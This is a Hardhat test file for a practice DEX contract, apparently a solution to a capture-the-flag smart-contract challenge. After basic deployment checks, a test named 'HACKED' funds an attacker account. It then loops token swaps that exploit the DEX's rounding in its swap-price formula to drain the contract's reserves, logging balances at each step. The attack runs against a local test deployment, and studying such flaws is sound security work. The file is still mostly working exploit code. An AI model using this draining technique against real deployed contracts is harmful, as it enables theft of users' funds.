const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");
const { expect } = require("chai");
require ("@nomicfoundation/hardhat-chai-matchers");

describe("Dex", function() {
	const initialSupply = 1000;
	async function deploy() {
	    const [user1, user2] = await ethers.getSigners();

	    const Dex = await ethers.getContractFactory("Dex");
	    const dex = await Dex.deploy();
	    await dex.waitForDeployment();

		const Token1 = await ethers.getContractFactory("SwappableToken");
	    const token1 = await Token1.deploy(dex.target, "Token1", "TK1", initialSupply);
	    await token1.waitForDeployment();

		const Token2 = await ethers.getContractFactory("SwappableToken");
	    const token2 = await Token2.deploy(dex.target, "Token2", "TK2", initialSupply);
	    await token2.waitForDeployment();

	    return { user1, user2, token1, token2, dex }
	}

	async function getTokenBalance(tokenContract, owner) {

		const token = await ethers.getContractAt(tokenContract);

		const balance = await token.balanceOf(owner);
	  
		return balance; 
	}	

	  it("should be deployed", async function() {
	    const { token1, token2, dex } = await loadFixture(deploy);

	    expect(dex.target).to.be.properAddress;
	    expect(token1.target).to.be.properAddress;
	    expect(token2.target).to.be.properAddress;
	  });

	  it("contract DEX balance is 0 ETH", async function() {
	    const { user1, token1, token2, dex } = await loadFixture(deploy);

	    const balance = await ethers.provider.getBalance(dex.target);
		expect(balance).to.eq(0);
		expect(await token1.balanceOf(user1.getAddress())).to.eq(initialSupply);
		expect(await token2.balanceOf(user1.getAddress())).to.eq(initialSupply);
	  });
	it("HACKED", async function() {
	    const { user1, user2, token1, token2, dex } = await loadFixture(deploy);

	    const balance = await ethers.provider.getBalance(dex.target);
		const dexBalance = 100;
		expect(balance).to.eq(0);
		expect(await token1.balanceOf(user1.getAddress())).to.eq(initialSupply);
		expect(await token2.balanceOf(user1.getAddress())).to.eq(initialSupply);
		///NOTE - sending 10 of each token to hacker address
		await token1.transfer(user2, 10);
		await token2.transfer(user2, 10);
		///NOTE - sending 100 of each token to dex
		await token1.transfer(dex, dexBalance);
		await token2.transfer(dex, dexBalance);
		expect(await dex.connect(user2).getSwapPrice(token1, token2, 5)).to.eq(5);
		///NOTE - hacking starts here
		//await token2.connect(user2).transfer(dex, 1);
		async function showBalances(tokenFrom, tokenTo, swapAmountConst, branch) {
			console.log("---------------------------");
			console.log("\tuser\tdex\t" + branch); //user2
			console.log("token1\t" + await token1.balanceOf(user2) + "\t" + await token1.balanceOf(dex)); // + "\ttoken" + tokenFrom + " -> token" + tokenTo);
			console.log("token2\t" + await token2.balanceOf(user2) + "\t" + await token2.balanceOf(dex));
			console.log("swapAmount = " + swapAmountConst + " * " + await tokenTo.balanceOf(dex) + " / " + await tokenFrom.balanceOf(dex) + " = "+ await dex.getSwapPrice(tokenFrom, tokenTo, swapAmountConst)); //TODO - FIX LATER
		}
		//await showBalances();
		//expect(await dex.connect(user2).getSwapPrice(token1, token2, 1)).to.eq(0);
		///NOTE - seting allowed tokens for DEX
		await dex.setTokens(token1, token2);
		///NOTE - approve spending for dex
		await token1.connect(user2).approve(dex, 10000);
		await token2.connect(user2).approve(dex, 10000);
		
		await showBalances(token1,token2, 10, 0);
		await dex.connect(user2).swap(token1, token2, 10);
		for ( i = 0; i < 8; i++) {			
			if (await token1.balanceOf(user2) != 0) {
				if (await token1.balanceOf(user2) > token1.balanceOf(dex)){
					await showBalances(token1, token2, await token1.balanceOf(dex) - BigInt(1), 1);
					await dex.connect(user2).swap(token1, token2, await token1.balanceOf(dex) - BigInt(1));
				}
				else {
					if (await dex.connect(user2).getSwapPrice(token1, token2, await token1.balanceOf(user2)) > await token1.balanceOf(dex)) {
						await showBalances(token1,token2, await token1.balanceOf(dex) - BigInt(1), 6);
						await dex.connect(user2).swap(token1, token2, await token1.balanceOf(dex) - BigInt(1));
					}
					else {
						await showBalances(token1,token2, await token1.balanceOf(user2), 2);
						await dex.connect(user2).swap(token1, token2, await token1.balanceOf(user2));
					}
				}
			}
			else {
				if (await token2.balanceOf(user2) > await token2.balanceOf(dex)){
					await showBalances(token2,token1, await token2.balanceOf(dex) - BigInt(1), 3);
					await dex.connect(user2).swap(token2, token1, await token2.balanceOf(dex) - BigInt(1));
				}
				else {
					await showBalances(token2,token1, await token2.balanceOf(user2), 4);
					await dex.connect(user2).swap(token2, token1, await token2.balanceOf(user2));
				}
			}
		}
		await showBalances(token2,token1, 1, 0);
		await dex.connect(user2).swap(token2, token1, 1);
		console.log("token1\t" + await token1.balanceOf(user2) + "\t" + await token1.balanceOf(dex)); // + "\ttoken" + tokenFrom + " -> token" + tokenTo);
		console.log("token2\t" + await token2.balanceOf(user2) + "\t" + await token2.balanceOf(dex));
		await token1.transfer(dex, 2);
		await showBalances(token1,token2, 1, 0);
		await dex.connect(user2).swap(token1, token2, 1);
		await showBalances(token2,token1, 1, 0);
		await dex.connect(user2).swap(token2, token1, 1);
		console.log("token1\t" + await token1.balanceOf(user2) + "\t" + await token1.balanceOf(dex)); // + "\ttoken" + tokenFrom + " -> token" + tokenTo);
		console.log("token2\t" + await token2.balanceOf(user2) + "\t" + await token2.balanceOf(dex));
	  });
});

